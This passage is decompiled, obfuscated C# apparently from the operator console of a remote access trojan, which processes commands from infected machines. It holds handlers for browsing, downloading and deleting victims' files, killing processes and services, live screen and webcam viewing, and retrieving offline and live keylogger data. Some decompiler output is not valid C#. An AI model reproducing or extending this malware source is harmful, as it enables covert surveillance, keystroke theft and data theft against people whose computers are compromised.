						goto IL_30ED;
					}
					throw ProjectData.CreateProjectError(-2146828237);
					IL_3132:
					if (num31 != 0)
					{
						ProjectData.ClearProjectError();
					}
					string string_28 = text6;
					fTransferManager9.method_16(string_27, num51, string_28);
					fTransferManager fTransferManager_8 = Class130.fTransferManager_0;
					string file_TRANSFER_ID8 = cclient2.FILE_TRANSFER_ID;
					int num52 = 3;
					double num53 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
					flag3 = false;
					ptr10 = ref flag3;
					num28 = num53;
					int num54 = num52;
					string string_29 = file_TRANSFER_ID8;
					fTransferManager fTransferManager10 = fTransferManager_8;
					object obj17;
					try
					{
						ProjectData.ClearProjectError();
						num30 = 2;
						string text5 = string.Empty;
						if (num28 >= 1099511627776.0)
						{
							text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
						}
						else if (num28 >= 1073741824.0)
						{
							text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
						}
						else if (num28 >= 1048576.0)
						{
							text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
						}
						else if (num28 >= 1024.0)
						{
							text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
						}
						else if (num28 < 1024.0)
						{
							text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
						}
						if (ptr10)
						{
							text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
						}
						if (text5.Length > 0)
						{
							text6 = text5;
						}
						else
						{
							text6 = " 0 B";
						}
						IL_32EF:
						goto IL_333F;
						IL_32F1:
						text6 = "0 B";
						goto IL_32EF;
						IL_32FA:
						num31 = -1;
						@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
						IL_3310:;
					}
					catch when (endfilter(obj17 is Exception & num30 != 0 & num31 == 0))
					{
						Exception ex29 = (Exception)obj18;
						goto IL_32FA;
					}
					throw ProjectData.CreateProjectError(-2146828237);
					IL_333F:
					if (num31 != 0)
					{
						ProjectData.ClearProjectError();
					}
					string str19 = text6;
					fTransferManager10.method_16(string_29, num54, str19 + " (100%)");
					if (cclient2.FILE_TRANSFER_ELAPSED / 1000.0 == 0.0)
					{
						fTransferManager fTransferManager_9 = Class130.fTransferManager_0;
						string file_TRANSFER_ID9 = cclient2.FILE_TRANSFER_ID;
						int num55 = 4;
						double num56 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
						flag3 = false;
						ptr10 = ref flag3;
						num28 = num56;
						int num57 = num55;
						string string_30 = file_TRANSFER_ID9;
						fTransferManager fTransferManager11 = fTransferManager_9;
						object obj19;
						try
						{
							ProjectData.ClearProjectError();
							num30 = 2;
							string text5 = string.Empty;
							if (num28 >= 1099511627776.0)
							{
								text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
							}
							else if (num28 >= 1073741824.0)
							{
								text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
							}
							else if (num28 >= 1048576.0)
							{
								text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
							}
							else if (num28 >= 1024.0)
							{
								text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
							}
							else if (num28 < 1024.0)
							{
								text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
							}
							if (ptr10)
							{
								text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
							}
							if (text5.Length > 0)
							{
								text6 = text5;
							}
							else
							{
								text6 = " 0 B";
							}
							IL_3525:
							goto IL_3575;
							IL_3527:
							text6 = "0 B";
							goto IL_3525;
							IL_3530:
							num31 = -1;
							@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
							IL_3546:;
						}
						catch when (endfilter(obj19 is Exception & num30 != 0 & num31 == 0))
						{
							Exception ex30 = (Exception)obj20;
							goto IL_3530;
						}
						throw ProjectData.CreateProjectError(-2146828237);
						IL_3575:
						if (num31 != 0)
						{
							ProjectData.ClearProjectError();
						}
						string str20 = text6;
						fTransferManager11.method_16(string_30, num57, str20 + "/s");
					}
					Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Completed");
					Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, "N/A");
					Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
					left = string.Concat(new string[]
					{
						Application.StartupPath,
						"\\Downloads\\",
						cclient2.FILE_TRANSFER_USER,
						"\\",
						cclient2.FILE_TRANSFER_FILENAME
					});
					num48 = Conversions.ToLong(cclient2.FILE_TRANSFER_FILE_LAST_MODIFIED);
					ptr12 = ref left;
					if (File.Exists(ptr12))
					{
						DateTime dateTime = new DateTime(1970, 1, 1);
						try
						{
							File.SetLastWriteTimeUtc(ptr12, dateTime.AddSeconds((double)num48));
						}
						catch (Exception ex31)
						{
						}
					}
					Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
					cclient2.FILE_TRANSFER_COMPLETED = true;
					cclient2.FILE_TRANSFER_ACTIVE = false;
					checked
					{
						Class130.long_3 -= 1L;
						if (Class130.long_3 < 0L)
						{
							Class130.long_3 = 0L;
						}
					}
				}
				else
				{
					StringBuilder stringBuilder = new StringBuilder();
					if ((!cclient2.FILE_TRANSFER_ACTIVE & !cclient2.SCREENLIVE_ACTIVE & !cclient2.SCREENLIVE_SECONDARY_ACTIVE & !cclient2.SCREEN_PREVIEW_ACTIVE & !cclient2.WEBCAM_PREVIEW_ACTIVE & !cclient2.WEBCAMSTREAM_ACTIVE & !cclient2.REMOTE_BROWSER_ACTIVE & !cclient2.SOCKET_COMMAND_ACTIVE) && num > 0)
					{
						stringBuilder.Append(Encoding.UTF8.GetString(ptr, 0, num));
						string text14 = stringBuilder.ToString().Trim();
						if (Operators.CompareString(text14, string.Empty, true) != 0)
						{
							string left = Strings.Split(text14, "|", 2, CompareMethod.Text)[0];
							if (Operators.CompareString(left, "SC_ST", true) == 0)
							{
								try
								{
									cclient2.sock_async.socket_0.ReceiveBufferSize = Class135.smethod_0().TransfersRecvBytes;
									string[] array9 = Strings.Split(text14, "|", 3, CompareMethod.Text);
									cclient2.SCREENLIVE_ACTIVE = true;
									cclient2.SCREENLIVE_USER_KEY = array9[1];
									ref double ptr2 = ref Class130.struct20_0.double_2;
									Class130.struct20_0.double_2 = ptr2 + (double)num;
									ptr2 = ref Class130.struct20_0.double_4;
									Class130.struct20_0.double_4 = ptr2 + 1.0;
									string key = cclient2.SCREENLIVE_USER_KEY;
									bool flag5;
									try
									{
										flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
										goto IL_4CE7;
									}
									catch (Exception ex32)
									{
									}
									flag5 = false;
									IL_4CE7:
									if (!flag5)
									{
										CClient cclient90 = cclient2;
										bool flag3 = false;
										cclient90.SOCKET_DISCONNECT(ref flag3);
									}
									else
									{
										if (array9[2].Length > 0)
										{
											cclient2.sPacket.Append(array9[2]);
										}
										CClient cclient91 = Class130.concurrentDictionary_3[cclient2.SCREENLIVE_USER_KEY];
										ptr2 = ref cclient91.stats_bytes_in;
										cclient91.stats_bytes_in = ptr2 + (double)num;
										Class130.concurrentDictionary_3[cclient2.SCREENLIVE_USER_KEY].SCREENLIVE_SOCKET_ID = cclient2.sKey;
									}
								}
								catch (Exception ex33)
								{
									CClient cclient92 = cclient2;
									bool flag3 = false;
									cclient92.SOCKET_DISCONNECT(ref flag3);
								}
								return;
							}
							if (Operators.CompareString(left, "SC_ST2", true) == 0)
							{
								try
								{
									cclient2.sock_async.socket_0.ReceiveBufferSize = Class135.smethod_0().TransfersRecvBytes;
									string[] array9 = Strings.Split(text14, "|", 3, CompareMethod.Text);
									cclient2.SCREENLIVE_SECONDARY_ACTIVE = true;
									cclient2.SCREENLIVE_SECONDARY_USER_KEY = array9[1];
									ref double ptr2 = ref Class130.struct20_0.double_2;
									Class130.struct20_0.double_2 = ptr2 + (double)num;
									ptr2 = ref Class130.struct20_0.double_4;
									Class130.struct20_0.double_4 = ptr2 + 1.0;
									string key = cclient2.SCREENLIVE_SECONDARY_USER_KEY;
									bool flag5;
									try
									{
										flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
										goto IL_4E19;
									}
									catch (Exception ex34)
									{
									}
									flag5 = false;
									IL_4E19:
									if (!flag5)
									{
										CClient cclient93 = cclient2;
										bool flag3 = false;
										cclient93.SOCKET_DISCONNECT(ref flag3);
									}
									else
									{
										if (array9[2].Length > 0)
										{
											cclient2.sPacket.Append(array9[2]);
										}
										CClient cclient94 = Class130.concurrentDictionary_3[cclient2.SCREENLIVE_SECONDARY_USER_KEY];
										ptr2 = ref cclient94.stats_bytes_in;
										cclient94.stats_bytes_in = ptr2 + (double)num;
										Class130.concurrentDictionary_3[cclient2.SCREENLIVE_SECONDARY_USER_KEY].SCREENLIVE_SECONDARY_SOCKET_ID = cclient2.sKey;
									}
								}
								catch (Exception ex35)
								{
									CClient cclient95 = cclient2;
									bool flag3 = false;
									cclient95.SOCKET_DISCONNECT(ref flag3);
								}
								return;
							}
							if (Operators.CompareString(left, "SCK_CMD", true) == 0)
							{
								try
								{
									string[] array9 = Strings.Split(text14, "|", 3, CompareMethod.Text);
									cclient2.sock_async.socket_0.ReceiveBufferSize = Class135.smethod_0().TransfersRecvBytes;
									cclient2.SOCKET_COMMAND_ACTIVE = true;
									cclient2.SOCKET_COMMAND_USER_KEY = array9[1];
									ref double ptr2 = ref Class130.struct20_0.double_2;
									Class130.struct20_0.double_2 = ptr2 + (double)num;
									ptr2 = ref Class130.struct20_0.double_4;
									Class130.struct20_0.double_4 = ptr2 + 1.0;
									string key = cclient2.SOCKET_COMMAND_USER_KEY;
									bool flag5;
									try
									{
										flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
										goto IL_4F4B;
									}
									catch (Exception ex36)
									{
									}
									flag5 = false;
									IL_4F4B:
									if (!flag5)
									{
										CClient cclient96 = cclient2;
										bool flag3 = false;
										cclient96.SOCKET_DISCONNECT(ref flag3);
									}
									else
									{
										CClient cclient97 = Class130.concurrentDictionary_3[cclient2.SOCKET_COMMAND_USER_KEY];
										ptr2 = ref cclient97.stats_bytes_in;
										cclient97.stats_bytes_in = ptr2 + (double)num;
										if (array9[2].Length > 0)
										{
											cclient2.mPacket.Write(Encoding.UTF8.GetBytes(array9[2]), 0, Encoding.UTF8.GetBytes(array9[2]).Length);
											if (Encoding.UTF8.GetString(cclient2.mPacket.ToArray()).EndsWith("@"))
											{
												CClient cclient98 = Class130.concurrentDictionary_3[cclient2.SOCKET_COMMAND_USER_KEY];
												string text15 = Encoding.UTF8.GetString(cclient2.mPacket.ToArray());
												ref string ptr3 = ref text15;
												CClient cclient7 = cclient98;
												CClient.Class152 @class = new CClient.Class152();
												@class.cclient_0 = cclient7;
												checked
												{
													if (ptr3.EndsWith("@"))
													{
														ptr3 = ptr3.Remove(ptr3.Length - 1);
													}
													string[] array = Strings.Split(ptr3, "|", 4, CompareMethod.Text);
													fMain ff7 = cclient7.ff;
													CClient cclient8 = cclient7;
													long num2 = Class136.smethod_36();
													string[] array10 = array;
													int num58 = 1;
													ref string ptr4 = ref array10[num58];
													long value = Conversions.ToLong(array10[num58]);
													ff7.method_19(ref cclient8, ref num2, ref value);
													ptr4 = Conversions.ToString(value);
													try
													{
														CClient.Class151 class2 = new CClient.Class151();
														class2.class152_0 = @class;
														class2.byte_0 = Convert.FromBase64String(array[3]);
														class2.class152_0.string_0 = Strings.Split(Encoding.UTF8.GetString(Convert.FromBase64String(array[3])), "|", -1, CompareMethod.Text);
														long num4 = Conversions.ToLong(array[2]);
														string left2 = Strings.LCase(array[0]);
														if (Operators.CompareString(left2, "cli_sleep", true) == 0)
														{
															if (Conversion.Val(class2.class152_0.string_0[0]) == 0.0)
															{
																cclient7.pending_dc = false;
																cclient7.pending_dc_timeout = false;
																cclient7.bJustConnected = false;
															}
														}
														else if (Operators.CompareString(left2, "cli_hib", true) == 0)
														{
															if (Conversion.Val(class2.class152_0.string_0[0]) == 0.0)
															{
																cclient7.pending_dc = false;
																cclient7.pending_dc_timeout = false;
																cclient7.bJustConnected = false;
															}
														}
														else if (Operators.CompareString(left2, "cli_log", true) == 0)
														{
															if (Conversion.Val(class2.class152_0.string_0[0]) == 0.0)
															{
																cclient7.pending_dc = false;
																cclient7.pending_dc_timeout = false;
																cclient7.bJustConnected = false;
															}
														}
														else if (Operators.CompareString(left2, "cli_rs", true) == 0)
														{
															if (Conversion.Val(class2.class152_0.string_0[0]) == 0.0)
															{
																cclient7.pending_dc = false;
																cclient7.pending_dc_timeout = false;
																cclient7.bJustConnected = false;
															}
														}
														else if (Operators.CompareString(left2, "cli_off", true) == 0)
														{
															if (Conversion.Val(class2.class152_0.string_0[0]) == 0.0)
															{
																cclient7.pending_dc = false;
																cclient7.pending_dc_timeout = false;
																cclient7.bJustConnected = false;
															}
														}
														else if (Operators.CompareString(left2, "con", true) == 0)
														{
															int num5 = class2.class152_0.string_0.Length;
															if (num5 != 15)
															{
																if (num5 == 16)
																{
																	fMain ff8 = cclient7.ff;
																	cclient8 = cclient7;
																	ff8.method_20(ref cclient8, ref class2.class152_0.string_0[0], ref class2.class152_0.string_0[1], ref class2.class152_0.string_0[2], ref class2.class152_0.string_0[3], ref class2.class152_0.string_0[4], ref class2.class152_0.string_0[5], ref class2.class152_0.string_0[6], ref class2.class152_0.string_0[7], ref class2.class152_0.string_0[8], ref class2.class152_0.string_0[9], ref class2.class152_0.string_0[10], ref class2.class152_0.string_0[11], ref class2.class152_0.string_0[12], ref class2.class152_0.string_0[13], ref class2.class152_0.string_0[14], ref class2.class152_0.string_0[15]);
																}
															}
															else
															{
																fMain ff9 = cclient7.ff;
																cclient8 = cclient7;
																string[] string_31 = class2.class152_0.string_0;
																int num59 = 0;
																string[] string_32 = class2.class152_0.string_0;
																int num60 = 1;
																string[] string_33 = class2.class152_0.string_0;
																int num61 = 2;
																string[] string_34 = class2.class152_0.string_0;
																int num62 = 3;
																string[] string_35 = class2.class152_0.string_0;
																int num63 = 4;
																string[] string_36 = class2.class152_0.string_0;
																int num64 = 5;
																string[] string_37 = class2.class152_0.string_0;
																int num65 = 6;
																string[] string_38 = class2.class152_0.string_0;
																int num66 = 7;
																string[] string_39 = class2.class152_0.string_0;
																int num67 = 8;
																string[] string_40 = class2.class152_0.string_0;
																int num68 = 9;
																string[] string_41 = class2.class152_0.string_0;
																int num69 = 10;
																string[] string_42 = class2.class152_0.string_0;
																int num70 = 11;
																string[] string_43 = class2.class152_0.string_0;
																int num71 = 12;
																string[] string_44 = class2.class152_0.string_0;
																int num72 = 13;
																string[] string_45 = class2.class152_0.string_0;
																int num73 = 14;
																string text = "Default";
																ff9.method_20(ref cclient8, ref string_31[num59], ref string_32[num60], ref string_33[num61], ref string_34[num62], ref string_35[num63], ref string_36[num64], ref string_37[num65], ref string_38[num66], ref string_39[num67], ref string_40[num68], ref string_41[num69], ref string_42[num70], ref string_43[num71], ref string_44[num72], ref string_45[num73], ref text);
															}
														}
														else if (Operators.CompareString(left2, "info", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient99 = cclient7;
																bool flag = true;
																cclient99.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															new Thread(new ThreadStart(class2.class152_0._Lambda$__0)).Start();
														}
														else if (Operators.CompareString(left2, "drives_get", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient100 = cclient7;
																bool flag = true;
																cclient100.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															new Thread(new ThreadStart(class2.class152_0._Lambda$__1)).Start();
														}
														else if (Operators.CompareString(left2, "files_get", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient101 = cclient7;
																bool flag = true;
																cclient101.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															new Thread(new ThreadStart(class2.class152_0._Lambda$__2)).Start();
														}
														else if (Operators.CompareString(left2, "files_search", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient102 = cclient7;
																bool flag = true;
																cclient102.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															cclient7.fSrch.method_3(class2.class152_0.string_0[0], class2.class152_0.string_0[1], class2.class152_0.string_0[2], class2.class152_0.string_0[3], class2.class152_0.string_0[4], class2.class152_0.string_0[5], string.Empty, string.Empty);
														}
														else if (Operators.CompareString(left2, "files_search_error_start", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient103 = cclient7;
																bool flag = true;
																cclient103.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															cclient7.fSrch.method_2(class2.class152_0.string_0[0]);
														}
														else if (Operators.CompareString(left2, "files_search_error_file", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient104 = cclient7;
																bool flag = true;
																cclient104.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															cclient7.fSrch.method_3(class2.class152_0.string_0[0], class2.class152_0.string_0[1], class2.class152_0.string_0[2], "N/A", class2.class152_0.string_0[3], "N/A", string.Empty, class2.class152_0.string_0[4]);
														}
														else if (Operators.CompareString(left2, "files_search_path", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient105 = cclient7;
																bool flag = true;
																cclient105.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															cclient7.fSrch.method_8(class2.class152_0.string_0[0]);
															cclient7.fSrch.method_1(class2.class152_0.string_0[1]);
														}
														else if (Operators.CompareString(left2, "files_search_done", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient106 = cclient7;
																bool flag = true;
																cclient106.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															cclient7.fSrch.method_5(true, class2.class152_0.string_0[0]);
														}
														else if (Operators.CompareString(left2, "files_zip_start", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient107 = cclient7;
																bool flag = true;
																cclient107.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															new Thread(new ThreadStart(class2.class152_0._Lambda$__3)).Start();
														}
														else if (Operators.CompareString(left2, "files_zip", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient108 = cclient7;
																bool flag = true;
																cclient108.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															new Thread(new ThreadStart(class2.class152_0._Lambda$__4)).Start();
														}
														else if (Operators.CompareString(left2, "files_zip_end", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient109 = cclient7;
																bool flag = true;
																cclient109.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															new Thread(new ThreadStart(class2.class152_0._Lambda$__5)).Start();
														}
														else if (Operators.CompareString(left2, "files_delete_start", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient110 = cclient7;
																bool flag = true;
																cclient110.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															fDashboard fDB11 = cclient7.fDB;
															value = (long)Math.Round(Conversion.Val(class2.class152_0.string_0[0]));
															string text = "0";
															fDB11.method_4(ref value, ref text);
														}
														else if (Operators.CompareString(left2, "files_delete", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient111 = cclient7;
																bool flag = true;
																cclient111.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															fDashboard fDB12 = cclient7.fDB;
															value = (long)Math.Round(Conversion.Val(class2.class152_0.string_0[0]));
															fDB12.method_4(ref value, ref class2.class152_0.string_0[1]);
														}
														else if (Operators.CompareString(left2, "files_delete_end", true) == 0)
														{
															if (cclient7.fDB == null)
															{
																CClient cclient112 = cclient7;
																bool flag = true;
																cclient112.SOCKET_DISCONNECT(ref flag);
																goto IL_7149;
															}
															fDashboard fDB13 = cclient7.fDB;
															value = (long)Math.Round(Conversion.Val(class2.class152_0.string_0[0]));
															fDB13.method_4(ref value, ref class2.class152_0.string_0[1]);
														}
														else
														{
															if (Operators.CompareString(left2, "files_download", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient113 = cclient7;
																	bool flag = true;
																	cclient113.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																string text16 = string.Concat(new string[]
																{
																	Application.StartupPath,
																	"\\Downloads\\",
																	Strings.Replace(cclient7.sUser, "\\", "^", 1, -1, CompareMethod.Text),
																	"\\",
																	Strings.Replace(class2.class152_0.string_0[0], ":", string.Empty, 1, -1, CompareMethod.Text)
																});
																byte[] array11 = Convert.FromBase64String(class2.class152_0.string_0[1]);
																bool flag2 = true;
																byte[] byte_ = array11;
																string string_16 = text16;
																Class136.Class142 class3 = new Class136.Class142();
																class3.string_0 = string_16;
																class3.byte_0 = byte_;
																class3.bool_0 = false;
																try
																{
																	if (flag2)
																	{
																		new Thread(new ThreadStart(class3._Lambda$__0)).Start();
																	}
																	else
																	{
																		Class136.smethod_15(ref class3.string_0, ref class3.byte_0, class3.bool_0);
																	}
																	goto IL_70F8;
																}
																catch (Exception ex37)
																{
																	goto IL_70F8;
																}
															}
															if (Operators.CompareString(left2, "prc_list", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient114 = cclient7;
																	bool flag = true;
																	cclient114.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																new Thread(new ThreadStart(class2.class152_0._Lambda$__6)).Start();
															}
															else if (Operators.CompareString(left2, "prc_kill", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient115 = cclient7;
																	bool flag = true;
																	cclient115.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
																{
																	new Thread(new ThreadStart(class2.class152_0._Lambda$__7)).Start();
																}
															}
															else if (Operators.CompareString(left2, "srv_list", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient116 = cclient7;
																	bool flag = true;
																	cclient116.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																new Thread(new ThreadStart(class2.class152_0._Lambda$__8)).Start();
															}
															else if (Operators.CompareString(left2, "srv_start", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient117 = cclient7;
																	bool flag = true;
																	cclient117.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
																{
																	new Thread(new ThreadStart(class2.class152_0._Lambda$__9)).Start();
																}
															}
															else if (Operators.CompareString(left2, "srv_control", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient118 = cclient7;
																	bool flag = true;
																	cclient118.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
																{
																	new Thread(new ThreadStart(class2.class152_0._Lambda$__10)).Start();
																}
															}
															else if (Operators.CompareString(left2, "srv_uninstall", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient119 = cclient7;
																	bool flag = true;
																	cclient119.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
																{
																	new Thread(new ThreadStart(class2.class152_0._Lambda$__11)).Start();
																}
															}
															else if (Operators.CompareString(left2, "wnd_list", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient120 = cclient7;
																	bool flag = true;
																	cclient120.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																new Thread(new ThreadStart(class2.class152_0._Lambda$__12)).Start();
															}
															else if (Operators.CompareString(left2, "wnd_cmd", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient121 = cclient7;
																	bool flag = true;
																	cclient121.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
																{
																	new Thread(new ThreadStart(class2.class152_0._Lambda$__13)).Start();
																}
															}
															else if (Operators.CompareString(left2, "wnd_title", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient122 = cclient7;
																	bool flag = true;
																	cclient122.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
																{
																	new Thread(new ThreadStart(class2.class152_0._Lambda$__14)).Start();
																}
															}
															else if (Operators.CompareString(left2, "screenlive", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient123 = cclient7;
																	bool flag = true;
																	cclient123.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																if (num4 - 1L == unchecked((long)array[3].Length))
																{
																	MemoryStream stream = new MemoryStream(class2.byte_0);
																	cclient7.fDB.vmethod_24().Image = Image.FromStream(stream);
																	cclient7.SCREEN_FPS_UPDATE((double)(Strings.Len(array[0]) + Strings.Len(array[1]) + Strings.Len(array[2]) + Strings.Len(array[3]) + 4));
																}
															}
															else if (Operators.CompareString(left2, "screenlive_secondary", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient124 = cclient7;
																	bool flag = true;
																	cclient124.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																if (num4 - 1L == unchecked((long)array[3].Length))
																{
																	MemoryStream stream2 = new MemoryStream(class2.byte_0);
																	cclient7.fDB.vmethod_248().Image = Image.FromStream(stream2);
																}
															}
															else if (Operators.CompareString(left2, "screenlive_stop", true) == 0)
															{
																if (cclient7.fDB == null)
																{
																	CClient cclient125 = cclient7;
																	bool flag = true;
																	cclient125.SOCKET_DISCONNECT(ref flag);
																	goto IL_7149;
																}
																cclient7.fDB.method_6();
															}
															else if (Operators.CompareString(left2, "screen_preview_stop", true) != 0)
															{
																if (Operators.CompareString(left2, "monitors_refresh", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient126 = cclient7;
																		bool flag = true;
																		cclient126.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	cclient7.fDB.method_7(ref class2.class152_0.string_0[0]);
																}
																else if (Operators.CompareString(left2, "webcamlive", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient127 = cclient7;
																		bool flag = true;
																		cclient127.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	if (num4 - 1L == unchecked((long)array[3].Length))
																	{
																		MemoryStream stream3 = new MemoryStream(class2.byte_0);
																		cclient7.fDB.vmethod_264().Image = Image.FromStream(stream3);
																		CClient cclient128 = cclient7;
																		double num21 = (double)(Strings.Len(array[0]) + Strings.Len(array[1]) + Strings.Len(array[2]) + Strings.Len(array[3]) + 4);
																		cclient128.WEBCAM_FPS_UPDATE(ref num21);
																	}
																}
																else if (Operators.CompareString(left2, "webcam_start", true) == 0)
																{
																	bool flag;
																	if (cclient7.fDB == null)
																	{
																		CClient cclient129 = cclient7;
																		flag = true;
																		cclient129.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	fDashboard fDB14 = cclient7.fDB;
																	flag = true;
																	fDB14.method_9(ref flag);
																}
																else if (Operators.CompareString(left2, "webcam_stop", true) == 0)
																{
																	bool flag;
																	if (cclient7.fDB == null)
																	{
																		CClient cclient130 = cclient7;
																		flag = true;
																		cclient130.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	fDashboard fDB15 = cclient7.fDB;
																	flag = false;
																	fDB15.method_9(ref flag);
																}
																else if (Operators.CompareString(left2, "webcam_devices", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient131 = cclient7;
																		bool flag = true;
																		cclient131.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	cclient7.fDB.method_8(ref class2.class152_0.string_0[0]);
																}
																else if (Operators.CompareString(left2, "klgoff_list", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient132 = cclient7;
																		bool flag = true;
																		cclient132.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	cclient7.fDB.method_87(ref class2.class152_0.string_0[0]);
																}
																else if (Operators.CompareString(left2, "klgoff_get", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient133 = cclient7;
																		bool flag = true;
																		cclient133.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	cclient7.fDB.method_88(ref class2.class152_0.string_0[0]);
																}
																else if (Operators.CompareString(left2, "klgoff_del", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient134 = cclient7;
																		bool flag = true;
																		cclient134.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	cclient7.fDB.method_95(ref class2.class152_0.string_0[0]);
																}
																else if (Operators.CompareString(left2, "klgonlinestart", true) == 0)
																{
																	bool flag;
																	if (cclient7.fDB == null)
																	{
																		CClient cclient135 = cclient7;
																		flag = true;
																		cclient135.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	fDashboard fDB16 = cclient7.fDB;
																	flag = true;
																	fDB16.method_101(ref flag);
																}
																else if (Operators.CompareString(left2, "klgonlinestop", true) == 0)
																{
																	bool flag;
																	if (cclient7.fDB == null)
																	{
																		CClient cclient136 = cclient7;
																		flag = true;
																		cclient136.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
																	}
																	fDashboard fDB17 = cclient7.fDB;
																	flag = false;
																	fDB17.method_101(ref flag);
																}
																else if (Operators.CompareString(left2, "klgonlinedata", true) == 0)
																{
																	if (cclient7.fDB == null)
																	{
																		CClient cclient137 = cclient7;
																		bool flag = true;
																		cclient137.SOCKET_DISCONNECT(ref flag);
																		goto IL_7149;
